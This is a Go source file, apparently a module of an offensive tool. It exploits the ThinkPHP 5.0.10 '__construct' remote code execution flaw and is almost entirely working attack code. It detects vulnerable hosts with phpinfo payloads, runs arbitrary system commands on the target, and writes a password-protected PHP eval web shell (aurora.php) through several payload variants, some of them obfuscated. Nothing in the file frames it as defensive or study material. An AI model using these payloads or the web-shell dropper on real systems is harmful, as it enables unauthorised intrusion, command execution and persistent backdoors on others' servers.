package thinkphp

import (
	"breach/internal/util"
	"io"
	"net/http"
	"net/url"
	"strings"
)

type TP5010 struct {
	BaseUrl       string
	feature       string
	checkStr      string
	moduleList    []string
	currentModule string
}

func (t *TP5010) CheckVul() *util.Response {
	for _, s := range t.moduleList {
		resp, err := http.Get(t.BaseUrl + "/?=/" + s)
		if err != nil {
			return util.Fail(err.Error())
		}
		if resp.StatusCode == 200 {
			t.currentModule = s
			break
		}
	}
	if t.currentModule == "" {
		return util.Fail("no vulnerable")
	}
	payloads := []url.Values{
		{"_method": {"__construct"}, "method": {"get"}, "filter[]": {"phpinfo"}, "get[]": {"-1"}},
		{"s": {"-1"}, "_method": {"__construct"}, "method": {"get"}, "filter[]": {"phpinfo"}}}
	for _, payload := range payloads {
		client := &http.Client{}
		req, err := http.NewRequest(http.MethodPost, t.BaseUrl+"/?s="+t.currentModule, strings.NewReader(payload.Encode()))
		if err != nil {
			return util.Fail(err.Error())
		}
		resp, err := client.Do(req)
		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) {
			return util.Success(t.feature, t.feature)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP5010) ExecVul(cmd string) *util.Response {
	client := &http.Client{}
	req, err := http.NewRequest(http.MethodPost, t.BaseUrl+"/?s="+t.currentModule, strings.NewReader(url.Values{
		"s": {cmd}, "_method": {"__construct"}, "method": {}, "filter[]": {"system"},
	}.Encode()))
	if err != nil {
		return util.Fail(err.Error())
	}
	resp, err := client.Do(req)
	if err != nil {
		return util.Fail(err.Error())
	}
	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return util.Fail(err.Error())
	}
	res := string(bytes)[:strings.Index(string(bytes), "<")]
	if res == "" {
		return util.Success("success", string(bytes))
	}
	return util.Success("success", res)
}

func (t *TP5010) GetShell() *util.Response {
	params := []string{
		"_method=__construct&filter[]=system&mytest=echo '<?php @eval($_POST['aurora'])?>' >>aurora.php",
		"_method=__construct&method=get&filter[]=assert&get[]=file_put_contents('./aurora.php','<?php%20@eval($_POST[%27aurora%27])?>');",
		"_method=__construct&method=get&filter[]=assert&get[]=/*1111*//***/file_put_contents/*1**/(/***/'./aurora.php',/***/'<?php%20@eval($_POST[%27aurora%27])?>'/***/);');",
		"s=file_put_contents('./aurora.php','<?php%20@eval($_POST[%27aurora%27])?>');&_method=__construct&method=&filter[]=assert",
		"_method=__construct&method=get&filter[]=assert&get[]=copy('<?php%20@eval($_POST[%27aurora%27])?>', './aurora.php');",
	}
	client := &http.Client{}
	for _, p := range params {
		decodedParam, _ := url.QueryUnescape(p)
		paramsMap, _ := url.ParseQuery(decodedParam)
		urlValues := url.Values{}
		for key, values := range paramsMap {
			for _, value := range values {
				urlValues.Add(key, value)
			}
		}
		req, err := http.NewRequest(http.MethodPost, t.BaseUrl+"/?s="+t.currentModule, strings.NewReader(urlValues.Encode()))
		if err != nil {
			return util.Fail(err.Error())
		}
		resp, err := client.Do(req)
		if err != nil {
			return util.Fail(err.Error())
		}
		resp, err = http.Get(t.BaseUrl + "/aurora.php")
		if err != nil {
			return util.Fail(err.Error())
		}
		if resp.StatusCode == 200 {
			return util.Success("success", t.BaseUrl+"/aurora.php   Pass:aurora")
		}
	}
	return util.Fail("no vulnerable")
}

func NewTP5010(baseUrl string) *TP5010 {
	return &TP5010{
		BaseUrl:    baseUrl,
		feature:    "ThinkPHP 5.0.10 construct RCE",
		moduleList: []string{"manage", "admin", "api"},
		checkStr:   "PHP Version",
	}
}
